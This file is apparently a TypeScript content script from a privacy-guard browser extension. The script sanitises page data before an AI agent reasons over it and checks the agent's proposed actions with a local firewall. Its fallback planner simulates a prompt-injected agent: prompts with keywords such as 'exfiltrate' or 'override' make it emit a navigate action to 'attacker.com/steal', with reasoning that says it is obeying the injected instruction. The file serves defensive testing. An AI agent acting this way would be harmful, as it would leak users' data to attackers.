import { DOMExtractor } from './dom_extractor';
import { LocalPIIDetector } from '../privacy/pii_detector';
import { TaskIntentParser } from '../privacy/task_intent';
import { MinimumDisclosureEngine } from '../privacy/minimum_disclosure';
import { LocalActionFirewall } from '../firewall/action_firewall';
import { BrowserExecutor } from './action_executor';
import { PrivacyLedger } from '../ledger/privacy_ledger';
import { ClientCanvasRedactor } from './canvas_capture';
import { validateNetworkEgress } from '../privacy/egress_validator';
import { SanitizedContextPayload } from '../types/context';
import { ActionFirewallResult, IntentAnchor, StructuredAction } from '../types/action';

class ContentAgentController {
  private domExtractor = new DOMExtractor();
  private piiDetector = new LocalPIIDetector();
  private taskIntentParser = new TaskIntentParser();
  private mde = new MinimumDisclosureEngine();
  private firewall = new LocalActionFirewall();
  private executor = new BrowserExecutor();
  private redactor = new ClientCanvasRedactor();
  private ledger = PrivacyLedger.getInstance();

  private activeIntentAnchor: IntentAnchor | null = null;
  private currentLiveNodeMap = new Map<string, HTMLElement>();

  constructor() {
    this.initMessageListeners();
    console.log('[PrivacyGuard Content Agent] Active and listening in DOM.');
  }

  private initMessageListeners() {
    chrome.runtime.onMessage.addListener((request, _sender, sendResponse) => {
      if (request.type === 'START_TASK') {
        this.handleStartTask(request.userPrompt, request.taskId, request.forceSlowPath || false)
          .then(res => sendResponse(res))
          .catch(err => sendResponse({ error: err.message }));
        return true; // async response
      }

      if (request.type === 'EXECUTE_CONFIRMED_ACTION') {
        this.handleExecuteConfirmedAction(request.action, request.firewallResult)
          .then(res => sendResponse(res))
          .catch(err => sendResponse({ error: err.message }));
        return true;
      }

      if (request.type === 'GET_LEDGER_DATA') {
        const data = this.ledger.getFullLedger(request.taskId || 'default');
        sendResponse(data);
        return false;
      }
    });
  }

  private async handleStartTask(userPrompt: string, taskId: string, forceSlowPath: boolean = false) {
    const startTime = performance.now();
    const originDomain = window.location.origin;

    // 1. Create Immutable Local Intent Anchor
    this.activeIntentAnchor = this.taskIntentParser.createIntentAnchor(taskId, userPrompt, originDomain);

    // 2. Local Perception: Extract DOM tree
    const perceptionStart = performance.now();
    const { nodes, nodeMap } = this.domExtractor.extractDOMContext();
    this.currentLiveNodeMap = nodeMap;
    const perceptionMs = performance.now() - perceptionStart;

    // Determine Tiered Path Execution (Fast Path vs Slow Path)
    const hasVisualElements = document.querySelector('canvas, svg, img') !== null;
    const isSlowPath = forceSlowPath || hasVisualElements;

    // 3. Multimodal PII Perception (DOM + Regex + Visual OCR)
    const perceptionRes = await this.piiDetector.detectMultimodalEntities(nodes, document);
    const rawEntities = perceptionRes.entities;
    const ocrLatencyMs = perceptionRes.ocrLatencyMs;

    // 4. Minimum Disclosure Engine (MDE) Evaluation
    const mdeStart = performance.now();
    const evaluatedEntities = this.mde.evaluateDisclosure(rawEntities, this.activeIntentAnchor);
    const mdeMs = performance.now() - mdeStart;

    // Record privacy decisions in local ledger
    this.ledger.recordPerceptionDecisions(taskId, evaluatedEntities);

    // 5. Client Canvas Screenshot Redaction (Local Visual Masking)
    let sanitizedScreenshotBase64: string | undefined;
    if (isSlowPath) {
      const redactRes = await this.redactor.redactViewportScreenshot(evaluatedEntities);
      sanitizedScreenshotBase64 = redactRes.sanitizedBase64;
    }

    // 6. Construct Sanitized DOM Payload
    const sanitizedNodes = nodes.map(n => {
      const ent = evaluatedEntities.find(e => e.nodeId === n.nodeId);
      if (ent) {
        if (ent.treatment === 'TOKENIZE') {
          return { ...n, text: ent.assignedToken, sanitizedValue: ent.assignedToken, appliedTreatment: ent.treatment, assignedToken: ent.assignedToken };
        } else if (ent.treatment === 'MASK' || ent.treatment === 'REMOVE') {
          return { ...n, text: ent.maskedDisplay, sanitizedValue: ent.maskedDisplay, appliedTreatment: ent.treatment };
        }
      }
      return n;
    });

    // 7. Independent Network Egress Validation & Boundary Attestation Generation
    const boundaryReport = validateNetworkEgress(
      evaluatedEntities,
      sanitizedNodes,
      sanitizedScreenshotBase64,
      perceptionRes.visualPrivacyState,
      perceptionRes.unverifiedVisualRegionsMasked
    );
    this.ledger.recordBoundaryReport(boundaryReport);

    const mlBackendStatus = this.piiDetector.getVisualDetector().getBackendStatus();

    const sanitizedPayload: SanitizedContextPayload = {
      taskId,
      timestamp: Date.now(),
      originDomain,
      viewport: { width: window.innerWidth, height: window.innerHeight },
      sanitizedDomNodes: sanitizedNodes,
      sanitizedScreenshotBase64,
      mlBackendStatus,
      boundaryReport,
    };

    // 8. Network Egress: Send ONLY sanitized context to Remote Reasoning Server
    const networkStart = performance.now();
    const candidateAction = await this.queryRemoteReasoningServer(sanitizedPayload);
    const networkMs = performance.now() - networkStart;

    // 9. Local Action Firewall Validation against Intent Anchor
    const firewallStart = performance.now();
    const firewallResult = this.firewall.validateAction(
      candidateAction,
      this.activeIntentAnchor,
      originDomain,
      this.currentLiveNodeMap
    );
    const firewallMs = performance.now() - firewallStart;

    let executionResult = { success: false, message: 'Action pending approval or blocked' };

    // 10. Execute in Browser DOM if Firewall decision is ALLOW and authorization token exists
    if (firewallResult.decision === 'ALLOW' && firewallResult.authorizationToken) {
      executionResult = await this.executor.executeVerifiedAction(
        candidateAction,
        this.currentLiveNodeMap,
        originDomain,
        firewallResult.authorizationToken,
        this.firewall
      );
    }

    // Record action log in audit ledger
    this.ledger.recordFirewallDecision(taskId, candidateAction, firewallResult, executionResult.success);

    const totalMs = performance.now() - startTime;

    return {
      taskId,
      intentAnchor: this.activeIntentAnchor,
      boundaryReport,
      mlBackendStatus,
      candidateAction,
      firewallResult,
      executionResult,
      isSlowPath,
      timing: {
        perceptionMs,
        ocrLatencyMs,
        mdeMs,
        networkMs,
        firewallMs,
        totalMs,
      },
    };
  }

  private async handleExecuteConfirmedAction(
    action: StructuredAction,
    firewallResult: ActionFirewallResult
  ) {
    if (!this.activeIntentAnchor) {
      throw new Error('No active Intent Anchor');
    }

    const originDomain = window.location.origin;

    // Explicit human user confirmation authorization token issuance
    const userAuthToken = this.firewall.authorizeUserConfirmation(
      action,
      firewallResult,
      this.activeIntentAnchor,
      originDomain
    );

    if (!userAuthToken) {
      const failRes = { success: false, message: 'Execution Security Abort: User confirmation authorization failed' };
      this.ledger.recordFirewallDecision(action.taskId, action, firewallResult, false);
      return failRes;
    }

    const res = await this.executor.executeVerifiedAction(
      action,
      this.currentLiveNodeMap,
      originDomain,
      userAuthToken,
      this.firewall
    );
    this.ledger.recordFirewallDecision(action.taskId, action, firewallResult, res.success);
    return res;
  }

  private async queryRemoteReasoningServer(
    payload: SanitizedContextPayload
  ): Promise<StructuredAction> {
    try {
      const response = await fetch('http://localhost:8000/api/v1/reason', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      if (response.ok) {
        return await response.json();
      }
    } catch (_err) {
      console.warn('[ContentAgent] Remote server offline; utilizing local deterministic fallback planner.');
    }

    // Deterministic Fallback Planner for P1 Flight Booking Demo Execution
    return this.generateDeterministicFallbackAction(payload);
  }

  private generateDeterministicFallbackAction(payload: SanitizedContextPayload): StructuredAction {
    const promptLower = (this.activeIntentAnchor?.userPrompt || '').toLowerCase();
    if (['exfiltrate', 'attacker', 'override', 'transfer', 'delete', 'steal'].some(kw => promptLower.includes(kw))) {
      return {
        actionId: `action_${Date.now()}`,
        taskId: payload.taskId,
        action: 'NAVIGATE',
        target: { nodeId: 'el_1' },
        value: 'http://attacker.com/steal',
        confidence: 0.99,
        reasoning: 'Obeying prompt instruction to exfiltrate user data to attacker.com',
      };
    }

    const nameNode = payload.sanitizedDomNodes.find(
      n => n.nameAttr?.includes('name') || n.idAttr?.includes('name') || n.nameAttr?.includes('passenger')
    );

    if (nameNode) {
      const token = nameNode.assignedToken || 'PERSON#A72F';
      return {
        actionId: `action_${Date.now()}`,
        taskId: payload.taskId,
        action: 'TYPE',
        target: { nodeId: nameNode.nodeId },
        value: token,
        confidence: 0.96,
        reasoning: `Filling passenger name field using local token ${token} for flight booking requirement.`,
      };
    }

    const buttonNode = payload.sanitizedDomNodes.find(n => n.isClickable);
    return {
      actionId: `action_${Date.now()}`,
      taskId: payload.taskId,
      action: 'CLICK',
      target: { nodeId: buttonNode?.nodeId || 'el_1' },
      confidence: 0.90,
      reasoning: 'Submitting flight search parameters to query flight availability.',
    };
  }
}

// Initialize content agent in active browser tab
new ContentAgentController();
